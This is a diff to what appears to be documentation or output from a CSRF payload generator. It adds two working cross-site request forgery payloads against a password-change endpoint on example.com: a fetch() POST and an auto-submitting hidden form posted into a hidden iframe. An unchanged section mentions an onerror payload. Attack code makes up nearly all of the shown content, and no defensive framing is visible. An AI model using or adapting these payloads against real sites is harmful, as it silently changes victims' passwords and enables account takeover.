@@ -71,7 +71,8 @@ new_password=newpassword456
 
   
 ```
-   <!DOCTYPE html>
+
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -80,6 +81,22 @@ new_password=newpassword456
 </head>
 <body>
     <h1>Generated CSRF Payloads</h1>
+
+    <h2>Fetch Payload</h2>
+    <div>
+        <pre>
+<script>
+fetch("http://www.example.com/user/change-password", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+    },
+    body: "new_password=newpassword456xyy"
+});
+</script>
+</pre>
+    </div>
+    <hr>
 
     <h2>Onerror Payload</h2>
     <div>
@@ -94,8 +111,23 @@ new_password=newpassword456
     </div>
     <hr>
 
+    <h2>Form Payload</h2>
+    <div>
+        <pre>
+<form action="http://www.example.com/user/change-password" method="POST" target="hidden_iframe">
+    <input type="hidden" name="new_password" value="newpassword456xyy">
+    <script>
+        document.forms[0].submit();
+    </script>
+</form>
+<iframe name="hidden_iframe" style="display:none;"></iframe>
+</pre>
+    </div>
+    <hr>
+
 </body>
-</html> 
+</html>
+
 ```
 
 ------
